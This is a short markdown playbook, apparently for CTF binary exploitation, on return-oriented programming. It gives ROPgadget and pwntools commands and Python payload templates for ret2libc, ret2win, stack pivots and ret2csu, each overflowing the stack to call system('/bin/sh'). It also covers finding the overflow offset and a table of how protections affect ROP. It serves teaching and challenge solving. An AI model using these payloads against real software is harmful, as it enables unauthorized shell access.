# ROP Chains Playbook

## Gadget discovery

```bash
ROPgadget --binary ./challenge/bin --re 'pop rdi ; ret'
ROPgadget --binary ./challenge/bin --ropchain
```

With pwntools:
```python
from pwn import *
elf = ELF('./challenge/bin')
rop = ROP(elf)
rop.call('system', [next(elf.search(b'/bin/sh'))])
print(rop.dump())
```

## Common chain patterns

### ret2libc (leak-then-call)

Precondition: libc available (in `./challenge/` or detected), stack overflow that lets you set `rip`.

```python
# Stage 1: leak libc via puts(@got.puts) or printf
payload1 = b'A' * OFFSET
payload1 += p64(POP_RDI) + p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(elf.symbols['main'])  # return to main for stage 2

# Stage 2 (after receiving the leaked address):
libc.address = leaked - libc.symbols['puts']
payload2 = b'A' * OFFSET
payload2 += p64(POP_RDI) + p64(next(libc.search(b'/bin/sh')))
payload2 += p64(libc.symbols['system'])
```

### ret2win (function exists in binary)

If the binary has a `win()` / `give_flag()` / `pwn()` function, just call it:
```python
payload = b'A' * OFFSET + p64(elf.symbols['win'])
```

### Stack pivot

When you overflow into a small buffer but control a register pointing at a larger buffer: `leave; ret` or `pop rsp; ret` to pivot.

### ret2csu

Universal gadgets at end of `__libc_csu_init` in statically-linked-ish binaries. Pattern:
```
pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]
```
Lets you set 3 args via the second gadget, then call any GOT entry.

## Finding offset to return address

```bash
pattern create 200  # gdb-pwndbg
# crash the binary, check RIP
pattern offset $rip
```
Or with pwntools:
```python
from pwn import cyclic, cyclic_find
io.sendline(cyclic(200))
# observe crash, then:
offset = cyclic_find(0x6161616161616166)
```

## Protections vs. approach

| Protection | Effect on ROP |
|-----------|---------------|
| NX | Can't inject shellcode → must use ROP |
| ASLR + no PIE | Binary addresses fixed; leak libc for libc calls |
| ASLR + PIE | Need both a binary leak AND libc leak |
| Canary | Need to leak canary first (format string, small read) |
| RELRO full | Can't overwrite GOT — use libc directly |
